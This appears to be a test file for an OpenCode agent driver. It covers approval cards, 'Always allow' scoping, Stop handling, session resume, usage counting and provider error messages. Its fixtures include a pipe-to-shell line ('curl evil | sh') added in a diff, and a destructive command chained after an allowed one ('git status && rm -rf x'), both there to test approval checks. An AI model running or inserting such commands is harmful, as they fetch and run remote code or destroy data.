    const { d } = driver({ prompts: [[{ u: { sessionUpdate: "usage_update", used: 2010, size: 1_048_576, cost: { amount: 0.01, currency: "USD" } } }, text("x\n<｜DSML｜invoke>"), { result: { stopReason: "end_turn", usage: { inputTokens: 500, outputTokens: 10, totalTokens: 2010, cachedReadTokens: 1500 } } }], [text("y"), { result: { stopReason: "end_turn", usage: { inputTokens: 100, outputTokens: 5, cachedReadTokens: 400, cachedWriteTokens: 50 } } }]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.usage.at(-1)).toEqual({ inputTokens: 2550, outputTokens: 15, cachedInputTokens: 1900, costUsd: null, contextTokens: 2010, contextWindow: 1_048_576 });
  });

  test("a tool call written as text is taken out and asked for again, three times at most; an empty answer is asked about once", async () => {
    const leak = text('Reading.\n<｜DSML｜invoke name="read">');
    const { d, said } = driver({ prompts: [[leak], [leak], [leak], [leak], [text("gave up")]] });
    const { sink, out } = sinkFor();
    // After three times the reply says so, rather than looking finished.
    expect(await d.runTurn(turn(), sink)).toMatchObject({ ok: false, error: TEXT_TOOL_CALL_GAVE_UP });
    const prompts = said().filter((m) => m.method === "session/prompt").map((m) => m.params.prompt[0].text);
    expect(prompts).toEqual(["Go", TEXT_TOOL_CALL_NUDGE, TEXT_TOOL_CALL_NUDGE, TEXT_TOOL_CALL_NUDGE]);
    expect(out.text).not.toContain("DSML");
    expect(out.text).toBe("Reading.Reading.Reading.Reading.");

    const empty = driver({ prompts: [[], [text("Sorry: finished.")]] });
    const e = sinkFor();
    expect(await empty.d.runTurn(turn(), e.sink)).toEqual({ ok: true });
    expect(e.out.text).toBe("Sorry: finished.");
    expect(empty.said().filter((m) => m.method === "session/prompt").map((m) => m.params.prompt[0].text)).toEqual(["Go", EMPTY_ANSWER_NUDGE]);
  });

  test("the same call over and over is stopped and the model told; different calls aren't", async () => {
    const call = (i: number, command = "true") => [{ u: { sessionUpdate: "tool_call", toolCallId: `c${i}`, name: "shell", title: "shell", kind: "execute", status: "pending", rawInput: {} } }, { u: { sessionUpdate: "tool_call_update", toolCallId: `c${i}`, status: "in_progress", rawInput: { command } } }, { u: { sessionUpdate: "tool_call_update", toolCallId: `c${i}`, status: "in_progress", rawInput: { command } } }, { u: { sessionUpdate: "tool_call_update", toolCallId: `c${i}`, status: "completed" } }];
    const six = Array.from({ length: 6 }, (_, i) => call(i)).flat();
    const { d, said } = driver({ prompts: [[...six, { sleep: 100 }], [text("Trying something else.")]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(said().some((m) => m.method === "session/cancel")).toBe(true);
    expect(said().filter((m) => m.method === "session/prompt").at(-1).params.prompt[0].text).toContain("exactly the same tool call 6 times");
    expect(out.text).toBe("Trying something else.");

    const varied = driver({ prompts: [[...Array.from({ length: 12 }, (_, i) => call(i, `echo ${i}`)).flat(), text("Done.")]] });
    const v = sinkFor();
    expect(await varied.d.runTurn(turn(), v.sink)).toEqual({ ok: true });
    expect(varied.said().some((m) => m.method === "session/cancel")).toBe(false);
  });

  test("approvals are answered once, and Always allow stays in this chat, saved with its session", async () => {
    const shell = (id: string, command: string) => ({ ask: { toolCallId: id, title: command, kind: "execute", rawInput: { command } } });
    const { d, said } = driver({ prompts: [[shell("a", "git status"), shell("b", "git status --short"), { ask: { toolCallId: "e", title: "a.txt", kind: "edit", content: [{ type: "diff", path: "a.txt", oldText: "a", newText: "b" }] } }, { ask: { toolCallId: "e2", title: "b.txt", kind: "edit", locations: [{ path: "b.txt" }] } }, { ask: { toolCallId: "t", title: "browseros_run", kind: "other", rawInput: { code: "1" } } }, { ask: { toolCallId: "t2", title: "browseros_tabs", kind: "other", rawInput: {} } }, text("Done.")]] }, { mode: "ask" });
    const { sink, out } = sinkFor(["approve_always", "approve_always", "approve_always"]);
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.approvals.map((a) => a.always)).toEqual(["Always allow `git status` commands in this chat", "Always allow file changes in this chat", "Always allow BrowserOS neo in this chat"]);
    expect(out.session.opencodeAllowed).toEqual({ commands: ["git status:*"], files: true, tools: ["browseros_*"] });
    // Always "once" to OpenCode: its own "always" is a lasting rule for the whole project.
    const answers = said().filter((m) => m.result?.outcome).map((m) => m.result.outcome.optionId);
    expect(new Set(answers)).toEqual(new Set(["once"]));
    // And what's saved is honoured by the next process.
    const next = driver({ prompts: [[shell("a", "git status -s"), shell("b", "git status && rm -rf x"), text("Done.")]] }, { mode: "ask", session: { acpSessionId: "ses_fake", opencodeAllowed: { commands: ["git status:*"] } } });
    const n = sinkFor(["approve"]);
    expect(await next.d.runTurn(turn(), n.sink)).toEqual({ ok: true });
    expect(n.out.approvals.map((a) => a.title)).toEqual(["git status && rm -rf x"]);
  });

  test("a declined action: the model is told and goes on; Stop isn't a decline", async () => {
    const ask = { ask: { toolCallId: "a", title: "rm x", kind: "execute", rawInput: { command: "rm x" } } };
    const { d, said } = driver({ prompts: [[ask], [text("Going another way.")]] }, { mode: "ask" });
    const { sink, out } = sinkFor(["deny"]);
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(said().filter((m) => m.method === "session/prompt").at(-1).params.prompt[0].text).toContain("The user declined this action: rm x.");
    expect(out.text).toBe("Going another way.");

    const stop = driver({ prompts: [[{ u: { sessionUpdate: "tool_call", toolCallId: "s", name: "shell", title: "shell", kind: "execute", status: "pending", rawInput: {} } }, { sleep: 10_000 }]] });
    const st = sinkFor();
    const running = stop.d.runTurn(turn(), st.sink);
    while (!st.out.activities.length) await Bun.sleep(20);
    st.out.stop();
    expect(await running).toEqual({ ok: false, error: "stopped" });
  });

  test("Stop still ends the reply when OpenCode doesn't: its process is replaced", async () => {
    const { d } = driver({ prompts: [[text("Working."), { stuck: 30_000 }]] });
    const { sink, out } = sinkFor();
    const running = d.runTurn(turn(), sink);
    while (!out.text) await Bun.sleep(20);
    out.stop();
    expect(await running).toEqual({ ok: false, error: "stopped" });
  }, 12_000);

  test("a subagent's words aren't the reply; a model call being tried again is said, and cleared", async () => {
    const child = { "opencode/child-session": { id: "c", parentID: "p", depth: 1, title: "Look around" } };
    const { d } = driver({ prompts: [[text("Child words.", child), { u: { sessionUpdate: "session_info_update", _meta: { "opencode/retry": { attempt: 1, nextRetryAt: new Date(Date.now() + 5000).toISOString(), error: { message: "Cold pod starting." } } } } }, { u: { sessionUpdate: "session_info_update", _meta: { "opencode/retry": null } } }, text("Main words.")]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.text).toBe("Main words.");
    expect(out.statuses.some((s) => /^Refuseless: Cold pod starting\. Trying again in \d+s$/.test(s))).toBe(true);
  });

  test("a compaction shows as a card; /compact says it's done when OpenCode says nothing, and why when it failed", async () => {
    const marker = (status: string, extra = {}) => ({ u: { sessionUpdate: "session_info_update", _meta: { "opencode/compaction": { status, messageId: "m1", reason: "manual", ...extra } } } });
    const { d } = driver({ prompts: [[marker("started"), marker("completed")]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn("/compact"), sink)).toEqual({ ok: true });
    expect(out.text).toBe("Done: the conversation so far is summarised, and the chat goes on from the summary.");
    expect(out.activities).toEqual([{ kind: "notice", title: "Summarising the conversation so far", detail: "", status: "done" }]);
    const bad = driver({ prompts: [[marker("started"), marker("failed", { error: { message: "Compaction summary did not match the required template" } })]] });
    const b = sinkFor();
    expect(await bad.d.runTurn(turn("/compact"), b.sink)).toEqual({ ok: false, error: "Couldn't summarise the conversation: Compaction summary did not match the required template" });
  });

  test("OpenCode's errors in Crosstalk's plain words", async () => {
    const fails = async (error: unknown, deps = {}) => {
      const { d } = driver({ prompts: [[{ error }]] }, {}, deps);
      return d.runTurn(turn(), sinkFor().sink);
    };
    const auth = { code: -32000, message: "Authentication required: provider authentication required", data: {} };
    // One free read tells a refused key from Cloudflare's browser check.
    const asked: string[] = [];
    const refused = async (url: string | URL | Request) => {
      asked.push(String(url));
      return new Response("{}", { status: 401, headers: { "content-type": "application/json" } });
    };
    expect(await fails(auth, { fetch: refused as typeof fetch })).toEqual({ ok: false, error: REFUSED });
    expect(asked).toEqual(["https://api.refuseless.com/v1/models"]);
    const walled = async () => new Response("<title>Just a moment...</title>", { status: 403, headers: { "content-type": "text/html", "cf-mitigated": "challenge" } });
    expect((await fails(auth, { fetch: walled as unknown as typeof fetch })).error).toContain("Cloudflare check answered instead of its API");
    const offline = async () => {
      throw new Error("no network");
    };
    expect((await fails(auth, { fetch: offline as unknown as typeof fetch })).error).toContain("refused the key");
    expect((await fails({ code: -32603, message: "Internal error: Out of credits.", data: { errorName: "provider.quota" } })).error).toContain("isn't enough money in the account");
    expect((await fails({ code: -32603, message: "Internal error: Unknown model 'x'.", data: { errorName: "provider.invalid-request" } })).error).toContain("doesn't have the model");
    expect((await fails({ code: -32603, message: "Internal error: Too long.", data: { errorName: "provider.invalid-request" } })).error).toContain("turned the request down");
    const limited = await fails({ code: -32603, message: "Internal error: Rate limit exceeded", data: { errorName: "provider.rate-limit" } });
    expect(limited).toMatchObject({ ok: false, error: "429 rate limit: Rate limit exceeded", limit: { kind: "rate" } });
    expect((await fails({ code: -32603, message: "Internal error: Backend down.", data: { errorName: "provider.internal" } })).error).toContain("had a problem");
    expect(await fails({ code: -32603, message: "Internal error: Something else.", data: {} })).toEqual({ ok: false, error: "Something else." });
    // The program itself going away.
    const gone = driver({ prompts: [[{ exit: 3 }]] });
    const r = await gone.d.runTurn(turn(), sinkFor().sink);
    expect(r.ok).toBe(false);
    expect(r.error).toContain("OpenCode stopped unexpectedly");
  });

  test("Stop while it's starting: no prompt goes out, and a later message starts cleanly", async () => {
    let release = () => {};
    const waited = new Promise<void>((res) => (release = res));
    const { d, said } = driver({ prompts: [[text("Second reply.")]] }, {}, { browserUrl: async () => { await waited; return null; } });
    const first = sinkFor();
    const stopped = d.runTurn(turn("First"), first.sink);
    await Bun.sleep(20);
    first.out.stop();
    release();
    expect(await stopped).toEqual({ ok: false, error: "stopped" });
    expect(said().filter((m) => m.method === "session/prompt")).toEqual([]);
    const second = sinkFor();
    expect(await d.runTurn(turn("Second"), second.sink)).toEqual({ ok: true });
    expect(second.out.text).toBe("Second reply.");
    expect(said().filter((m) => m.method === "session/prompt").map((m) => m.params.prompt[0].text)).toEqual(["Second"]);
  });

  test("Stop during the wait after a session opens: the prompt never goes out", async () => {
    const { d, said } = driver({}, {}, { settleMs: 300, browserUrl: async () => "http://127.0.0.1:1/mcp" });
    const { sink, out } = sinkFor();
    const running = d.runTurn(turn(), sink);
    while (!out.session.acpSessionId) await Bun.sleep(5);
    out.stop();
    await d.interrupt();
    expect(await running).toEqual({ ok: false, error: "stopped" });
    expect(said().filter((m) => m.method === "session/prompt")).toEqual([]);
  });

  test("a saved session the agent still has but can't open now is kept: the reply fails, the next one picks it up", async () => {
    const gone = { code: -32000, message: "gone" };
    const { d, said } = driver({ resumeErrors: [gone, gone], prompts: [[text("Back.")]] }, { session: { acpSessionId: "ses_saved" } }, {});
    // The scripted agent answers its first two resumes by exiting (a reply tries twice to start): the process is gone, which
    // says nothing about the session.
    const first = sinkFor();
    const r = await d.runTurn(turn("One"), first.sink);
    expect(r.ok).toBe(false);
    expect(r.error).toContain("Nothing is lost");
    expect(first.out.session.acpSessionId).toBeUndefined();
    expect(said().filter((m) => m.method === "session/new")).toEqual([]);
    const second = sinkFor();
    expect(await d.runTurn(turn("Two"), second.sink)).toEqual({ ok: true });
    expect(second.out.text).toBe("Back.");
    expect(said().filter((m) => m.method === "session/resume").every((m) => m.params.sessionId === "ses_saved")).toBe(true);
  });

  test("a saved session that's busy opening is asked for again on the same process", async () => {
    const { d, said } = driver({ resumeErrors: [{ code: -32603, message: "still starting" }], prompts: [[text("Back.")]] }, { session: { acpSessionId: "ses_saved" } });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(said().filter((m) => m.method === "initialize")).toHaveLength(1);
    expect(said().filter((m) => m.method === "session/resume")).toHaveLength(2);
    expect(out.activities.filter((a) => a.kind === "notice")).toEqual([]);
  });

  test("a session the agent no longer has starts anew, and the chat says the conversation is gone", async () => {
    const { d } = driver({ resumeFails: true, prompts: [[text("New.")]] }, { session: { acpSessionId: "ses_gone" } });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.session.acpSessionId).toBe("ses_fake");
    expect(out.activities.find((a) => a.kind === "notice")?.title).toBe("OpenCode has lost this chat's earlier conversation");
  });

  test("a start that fails doesn't leave the chat stuck: the next message starts a new process", async () => {
    const failure = { code: -32603, message: "No models are available" };
    const { d, said } = driver({ newFails: [failure, failure], prompts: [[text("Fine now.")]] });
    const first = sinkFor();
    const r = await d.runTurn(turn("One"), first.sink);
    expect(r.error).toContain("No models are available");
    const second = sinkFor();
    expect(await d.runTurn(turn("Two"), second.sink)).toEqual({ ok: true });
    expect(second.out.text).toBe("Fine now.");
    expect(said().filter((m) => m.method === "initialize")).toHaveLength(3);
  });

  test("a start that fails once is tried again: chats starting together can trip over each other, and nothing had gone out", async () => {
    const { d, said } = driver({ newFails: [{ code: -32603, message: "exited (code 1)" }], prompts: [[text("Started.")]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn("One"), sink)).toEqual({ ok: true });
    expect(out.text).toBe("Started.");
    expect(said().filter((m) => m.method === "session/prompt")).toHaveLength(1);
  });

  test("the model can't be set: nothing goes out on whatever it fell back to", async () => {
    const { d, said } = driver({ modelFails: { code: -32603, message: "Model unavailable" }, prompts: [[text("Should not be seen.")]] });
    const { sink, out } = sinkFor();
    const r = await d.runTurn(turn(), sink);
    expect(r.error).toContain("Model unavailable");
    expect(out.text).toBe("");
    expect(said().filter((m) => m.method === "session/prompt")).toEqual([]);
  });

  test("Always allow is read from the saved session each time: one taken back asks at once, and a later save doesn't bring it back", async () => {
    const saved: Record<string, unknown> = { opencodeAllowed: { commands: ["git status:*"] } };
    const shell = (id: string, command: string) => ({ ask: { toolCallId: id, title: command, kind: "execute", rawInput: { command } } });
    const s = scripted({ prompts: [[shell("a", "git status"), { sleep: 60 }, shell("b", "git status -s"), shell("c", "ls -la"), text("Done.")]] });
    const ctx = { ...ctxFor(s.env, s.dir, { mode: "ask", session: saved }), latestSession: () => saved } as DriverContext;
    const d = new OpenCodeDriver(ctx, FAKE, { browserUrl: async () => null, runDir: join(s.dir, "run"), settleMs: 0 });
    cleanups.push(() => d.dispose());
    const { sink, out } = sinkFor(["approve", "approve_always"]);
    const original = sink.saveSession;
    sink.saveSession = (p) => {
      Object.assign(saved, p);
      original(p);
    };
    const running = d.runTurn(turn(), sink);
    await Bun.sleep(30);
    // Taken back in the middle of the reply.
    saved.opencodeAllowed = {};
    expect(await running).toEqual({ ok: true });
    expect(out.approvals.map((a) => a.title)).toEqual(["git status -s", "ls -la"]);
    expect(saved.opencodeAllowed).toEqual({ commands: ["ls:*"] });
  });

  test("a card for a command elsewhere says where and offers no Always; Always doesn't cover it either", async () => {
    const shell = (id: string, command: string, workdir?: string) => ({ ask: { toolCallId: id, title: command, kind: "execute", rawInput: { command, ...(workdir ? { workdir } : {}) } } });
    const { d } = driver({ prompts: [[shell("a", "git status", "/elsewhere"), shell("b", "git status", "~/x"), shell("c", "git status", "sub"), text("Done.")]] }, { mode: "ask", session: { opencodeAllowed: { commands: ["git status:*"] } } });
    const { sink, out } = sinkFor(["approve", "approve"]);
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.approvals.map((a) => [a.title, a.detail, a.always])).toEqual([["git status", "in /elsewhere", null], ["git status", "in ~/x", null]]);
  });

  test("Auto answers its read commands itself; anything else gets a card", async () => {
    const shell = (id: string, command: string) => ({ ask: { toolCallId: id, title: command, kind: "execute", rawInput: { command } } });
    // The hub's folder elsewhere: in a chat holding it, Auto answers for nothing.
    const { d } = driver({ prompts: [[shell("a", "git status --short"), shell("b", "git branch -D keep"), shell("c", "cat a.txt > b.txt"), text("Done.")]] }, { mode: "auto" }, { runDir: join(folder(), "run") });
    const { sink, out } = sinkFor(["approve", "approve"]);
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.approvals.map((a) => a.title)).toEqual(["git branch -D keep", "cat a.txt > b.txt"]);
    // Not in Ask: the same command asks.
    const ask = driver({ prompts: [[shell("a", "git status --short"), text("Done.")]] }, { mode: "ask" });
    const asked = sinkFor(["approve"]);
    await ask.d.runTurn(turn(), asked.sink);
    expect(asked.out.approvals.map((a) => a.title)).toEqual(["git status --short"]);
  });

  test("one card for one call, though OpenCode asks twice; a change outside the folder gets no Always, and Always on others doesn't cover it", async () => {
    const out1 = { toolCallId: "w", name: "write", title: "/elsewhere/a", kind: "edit", locations: [{ path: "/elsewhere/a" }], rawInput: { path: "/elsewhere/a", content: "x" } };
    const { d } = driver({ prompts: [[{ ask: out1 }, { ask: { ...out1, content: [{ type: "diff", path: "/elsewhere/a", oldText: null, newText: "x" }] } }, text("Done.")]] }, { mode: "ask", session: { opencodeAllowed: { files: true } } });
    const { sink, out } = sinkFor(["approve"]);
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.approvals).toHaveLength(1);
    expect(out.approvals[0]).toMatchObject({ kind: "file_change", title: "Write /elsewhere/a", always: null });
    expect(out.approvals[0].detail).toContain('"content": "x"');
  });

  test("reading outside the project asks each time; a fetch's Always is for that site only", async () => {
    const read = (id: string, path: string) => ({ ask: { toolCallId: id, name: "read", title: path, kind: "read", locations: [{ path }], rawInput: { path } } });
    const fetch1 = (id: string, url: string) => ({ ask: { toolCallId: id, name: "webfetch", title: url, kind: "fetch", locations: [], rawInput: { url } } });
    const { d } = driver({ prompts: [[read("a", "/elsewhere/a"), read("b", "/elsewhere/b"), fetch1("c", "https://one.example/a"), fetch1("d", "https://one.example/b"), fetch1("e", "https://two.example/?k=abc"), text("Done.")]] }, { mode: "ask" });
    const { sink, out } = sinkFor(["approve", "approve", "approve_always", "approve"]);
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.approvals.map((a) => [a.title, a.always])).toEqual([
      ["Read /elsewhere/a", null],
      ["Read /elsewhere/b", null],
      ["Fetch https://one.example/a", "Always allow fetching from one.example in this chat"],
      ["Fetch https://two.example/?k=abc", "Always allow fetching from two.example in this chat"],
    ]);
    expect(out.session.opencodeAllowed).toEqual({ hosts: ["one.example"] });
  });

  test("a question it takes back: the card goes, and nothing is taken as declined", async () => {
    const { d } = driver({ prompts: [[{ ask: { toolCallId: "a", title: "ls -la", kind: "execute", rawInput: { command: "ls -la" } }, cancelAfter: 30 }, text("Went on.")]] }, { mode: "ask" });
    const { sink, out } = sinkFor();
    const gone: boolean[] = [];
    sink.approval = (req, o) =>
      new Promise((res) => {
        out.approvals.push(req);
        o?.signal?.addEventListener("abort", () => {
          gone.push(true);
          res("deny");
        });
      });
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(gone).toEqual([true]);
    expect(out.text).toBe("Went on.");
  });

  test("the message counts as taken once OpenCode shows it has it, and only then", async () => {
    const taken = () => {
      const s = sinkFor();
      let n = 0;
      s.sink.taken = () => void n++;
      return { ...s, count: () => n };
    };
    // Its list of commands comes whenever, and says nothing about the prompt.
    const before = driver({ prompts: [[{ u: { sessionUpdate: "available_commands_update", availableCommands: [] } }, { error: { code: -32602, message: "session not found" } }]] });
    const a = taken();
    await before.d.runTurn(turn(), a.sink);
    expect(a.count()).toBe(0);
    // A model call that fails: OpenCode had the message, though nothing came back before the error.
    const refused = driver({ prompts: [[{ error: { code: -32603, message: "Out of credits", data: { errorName: "provider.quota" } } }]] });
    const b = taken();
    await refused.d.runTurn(turn(), b.sink);
    expect(b.count()).toBeGreaterThan(0);
    // A reply with nothing to say still got there.
    const silent = driver({ prompts: [[{ result: { stopReason: "end_turn" } }, text("x")], [text("y")]] });
    const c = taken();
    await silent.d.runTurn(turn(), c.sink);
    expect(c.count()).toBeGreaterThan(0);
  });

  test("Stop waits for the reply's own end, so what it used is counted", async () => {
    const { d } = driver({ prompts: [[text("Working."), { sleep: 5000 }]] });
    const { sink, out } = sinkFor();
    const running = d.runTurn(turn(), sink);
    while (!out.text) await Bun.sleep(5);
    out.stop();
    await d.interrupt();
    // The turn has ended by the time interrupt() returns: its usage was said by then.
    expect(out.usage.length).toBeGreaterThan(0);
    expect(await running).toEqual({ ok: false, error: "stopped" });
  });

  // It has no sign-in (shared agentHasSignIn): the base class's "isn't signed in" would send the person looking for one.
  test("a saved session refused for authentication: its service's key, said at once, with the session kept, not asked for again for two minutes, and never a sign-in", async () => {
    const asked: string[] = [];
    const read = async (url: string | URL | Request) => {
      asked.push(String(url));
      return new Response("{}", { status: 401, headers: { "content-type": "application/json" } });
    };
    const { d, said } = driver({ resumeErrors: [{ code: -32603, message: "Authentication required" }], prompts: [[text("Back.")]] }, { session: { acpSessionId: "ses_saved" } }, { fetch: read as typeof fetch });
    const { sink, out } = sinkFor();
    const at = Date.now();
    const r = await d.runTurn(turn(), sink);
    expect(r).toEqual({ ok: false, error: REFUSED });
    expect(Date.now() - at).toBeLessThan(5000);
    expect(asked).toEqual(["https://api.refuseless.com/v1/models"]);
    expect(said().filter((m) => m.method === "session/resume")).toHaveLength(1);
    expect(said().filter((m) => m.method === "session/new")).toEqual([]);
    expect(out.session.acpSessionId).toBeUndefined();
    // The next message starts a new process on the same session, and goes through.
    const again = sinkFor();
    expect(await d.runTurn(turn(), again.sink)).toEqual({ ok: true });
    expect(again.out.text).toBe("Back.");
    expect(said().filter((m) => m.method === "initialize")).toHaveLength(2);
    expect(said().filter((m) => m.method === "session/new")).toEqual([]);
  });

  test("a start refused for authentication, on a new session or by the agent's own code: the key, or Cloudflare's check, never `auth`, and not tried again", async () => {
    const refusedRead = (async () => new Response("{}", { status: 401, headers: { "content-type": "application/json" } })) as unknown as typeof fetch;
    const failure = { code: -32000, message: "Authentication required" };
    const fresh = driver({ newFails: [failure], prompts: [[text("Never.")]] }, {}, { fetch: refusedRead });
    expect(await fresh.d.runTurn(turn(), sinkFor().sink)).toEqual({ ok: false, error: REFUSED });
    expect(fresh.said().filter((m) => m.method === "session/new")).toHaveLength(1);
    const walled = (async () => new Response("<title>Just a moment...</title>", { status: 403, headers: { "content-type": "text/html", "cf-mitigated": "challenge" } })) as unknown as typeof fetch;
    const wall = driver({ resumeErrors: [{ ...failure, answered: true }], prompts: [[text("Never.")]] }, { session: { acpSessionId: "ses_saved" } }, { fetch: walled });
    const r = await wall.d.runTurn(turn(), sinkFor().sink);
    expect(r.error).toContain("Cloudflare check answered instead of its API");
    expect(r.auth).toBeUndefined();
    // A service with no key saved: what it needs is one.
    const noKey = driver({ newFails: [failure], prompts: [[text("Never.")]] }, { endpoint: { ...endpoint, key: "" } }, { fetch: refusedRead });
    expect((await noKey.d.runTurn(turn(), sinkFor().sink)).error).toBe("Refuseless needs a key — add it in Settings → AI services, then tap Try again.");
  });

  test("a stopped reply's answer still counts, where its store can't be read", async () => {
    const usage = { inputTokens: 10, outputTokens: 5, thoughtTokens: 7, cachedReadTokens: 2, cachedWriteTokens: 1 };
    const { d } = driver({ prompts: [[text("Working."), { sleep: 5000, result: { stopReason: "cancelled", usage } }]] });
    const { sink, out } = sinkFor();
    const running = d.runTurn(turn(), sink);
    while (!out.text) await Bun.sleep(5);
    out.stop();
    await d.interrupt();
    expect(out.usage.at(-1)).toMatchObject({ inputTokens: 13, outputTokens: 12, cachedInputTokens: 2 });
    expect(await running).toEqual({ ok: false, error: "stopped" });
  });

  test("usage is only said at a reply's end: said along the way, a reply the engine ends early would be counted again by the next", async () => {
    const shell = { ask: { toolCallId: "a", title: "rm x", kind: "execute", rawInput: { command: "rm x" } } };
    const { d } = driver({ prompts: [[shell], [text("Working."), { sleep: 5000 }]] }, { mode: "ask" });
    const { sink, out } = sinkFor(["deny"]);
    const running = d.runTurn(turn(), sink);
    while (!out.text) await Bun.sleep(5);
    expect(out.usage).toEqual([]);
    out.stop();
    await d.interrupt();
    await running;
    expect(out.usage).toHaveLength(1);
  });

  test("OpenCode's thinking counts as output", async () => {
    const { d } = driver({ prompts: [[text("x"), { result: { stopReason: "end_turn", usage: { inputTokens: 10, outputTokens: 5, thoughtTokens: 7, cachedReadTokens: 2, cachedWriteTokens: 1 } } }]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.usage.at(-1)).toMatchObject({ inputTokens: 13, outputTokens: 12, cachedInputTokens: 2 });
  });

  test("words for the limits a reply can reach, and a slash that isn't a command of OpenCode's", async () => {
    const shell = (id: string, command: string) => ({ ask: { toolCallId: id, title: command, kind: "execute", rawInput: { command } } });
    const { d, said } = driver({ prompts: [[shell("a", "rm x")], [shell("b", "rm y")], [shell("c", "rm z")], [shell("d", "rm w")], [shell("e", "rm v")], [shell("f", "rm u")]] }, { mode: "ask" });
    const { sink, out } = sinkFor();
    const r = await d.runTurn(turn("/review the code"), sink);
    expect(r.ok).toBe(false);
    expect(r.error).toContain("6 actions were declined");
    expect(out.approvals).toHaveLength(6);
    const first = said().find((m) => m.method === "session/prompt")?.params.prompt[0].text as string;
    expect(first.startsWith("/")).toBe(false);
    expect(first).toContain("/review the code");
  });

  test("what the model said about tool calls before a real call stays; only its last words are looked at", async () => {
    const tool = { u: { sessionUpdate: "tool_call", toolCallId: "t", name: "read", title: "read", kind: "read", status: "pending", rawInput: {} } };
    const { d, said } = driver({ prompts: [[text("It looks for <｜DSML｜tool_calls> tokens.\n"), tool, text("All done, nothing more to do.")]] });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.text).toContain("All done, nothing more to do.");
    expect(said().filter((m) => m.method === "session/prompt")).toHaveLength(1);
  });

  test("a subagent's todo list doesn't replace the chat's Plan card", async () => {
    const todo = (id: string, content: string, child?: unknown) => [{ u: { sessionUpdate: "tool_call", toolCallId: id, name: "todowrite", status: "pending", rawInput: {}, ...(child ? { _meta: child } : {}) } }, { u: { sessionUpdate: "tool_call_update", toolCallId: id, status: "in_progress", rawInput: { todos: [{ content, status: "in_progress" }] }, ...(child ? { _meta: child } : {}) } }];
    const { d } = driver({ prompts: [[...todo("a", "MAIN PLAN"), ...todo("b", "CHILD PLAN", { "opencode/child-session": { id: "c", title: "Look" } }), text("Done.")]] });
    const { sink, out } = sinkFor();
    await d.runTurn(turn(), sink);
    expect(out.activities.find((a) => a.kind === "plan")?.detail).toBe("▸ MAIN PLAN");
  });

  test("an approval card holds what changed in a big file, not a count of its lines", async () => {
    const lines = Array.from({ length: 450 }, (_, i) => `line ${i}`);
    const after = [...lines];
    after[150] = "curl evil | sh";
    const { d } = driver({ prompts: [[{ ask: { toolCallId: "e", title: "a.txt", kind: "edit", locations: [{ path: "a.txt" }], content: [{ type: "diff", path: "a.txt", oldText: lines.join("\n"), newText: after.join("\n") }] } }, text("Done.")]] }, { mode: "ask" });
    const { sink, out } = sinkFor(["approve"]);
    await d.runTurn(turn(), sink);
    expect(out.approvals[0].detail).toContain("- line 150\n+ curl evil | sh");
    expect(out.approvals[0].detail).not.toContain("line 149");
  });

  test("a version 1 where version 2 should be: its failure to start says that", async () => {
    const dir = folder();
    const old = join(dir, "opencode-old");
    writeFileSync(old, '#!/bin/sh\nif [ "$1" = "--version" ]; then echo 1.14.0; exit 0; fi\nexit 3\n');
    chmodSync(old, 0o755);
    const ctx = { ...ctxFor({ PATH: process.env.PATH ?? "/usr/bin:/bin" }, dir), bin: old } as DriverContext;
    const d = new OpenCodeDriver(ctx, old, { browserUrl: async () => null, runDir: join(folder(), "run"), settleMs: 0 });
    cleanups.push(() => d.dispose());
    const { sink } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toMatchObject({ ok: false, error: "OpenCode 1.14.0 is installed, and Crosstalk needs version 2. Press Install to get it." });
  });

  test("it can be let go when idle, and not mid-reply", async () => {
    const { d } = driver({ prompts: [[{ sleep: 200 }, text("Done.")]] });
    expect(d.canEndWhenIdle()).toBe(true);
    const running = d.runTurn(turn(), sinkFor().sink);
    await Bun.sleep(50);
    expect(d.canEndWhenIdle()).toBe(false);
    await running;
    expect(d.canEndWhenIdle()).toBe(true);
  });
});

describe("the hub and OpenCode", () => {
  function setup(fake?: { url: string }) {
    const dir = folder();
    const app = new App({ dbPath: ":memory:", config: { port: 0, host: "127.0.0.1", publicUrl: null, workspaceRoot: dir, maxHopsDefault: 6 } });
    app.services.timeoutMs = 1500;
    if (fake) app.services.refuseless.origin = fake.url;
    cleanups.push(() => app.shutdown());
    return { app, dir };
  }

  test("Refuseless's check offers OpenCode first, and its models carry their thinking levels", async () => {
    const fake = fakeRefuseless({ key: KEY });
    cleanups.push(() => fake.stop());
    const { app, dir } = setup(fake);
    const r = await app.services.test({ baseUrl: fake.base, apiKey: KEY });
    expect(r.works.slice(0, 2)).toEqual([{ provider: "opencode", via: "chat" }, { provider: "builtin", via: "chat" }]);
    const account = app.providers.setEndpointAccount("opencode", { label: "Refuseless", baseUrl: fake.base, apiKey: KEY, models: [MODEL], contextWindow: 1_048_576, protocol: "chat" });
    expect(app.providers.accounts().filter((a) => a.provider === "opencode").map((a) => a.id)).toEqual([account.id]);
    expect(() => app.providers.setEndpointAccount("opencode", { label: "Other", baseUrl: fake.base, apiKey: KEY, models: [MODEL], protocol: "responses" })).toThrow("Chat Completions style only");
    const models = await app.providers.models("opencode", account.id, { fresh: true });
    expect(models.models.find((m) => m.id === MODEL)).toMatchObject({ efforts: ["off", "low", "high", "max"], defaultEffort: "high" });
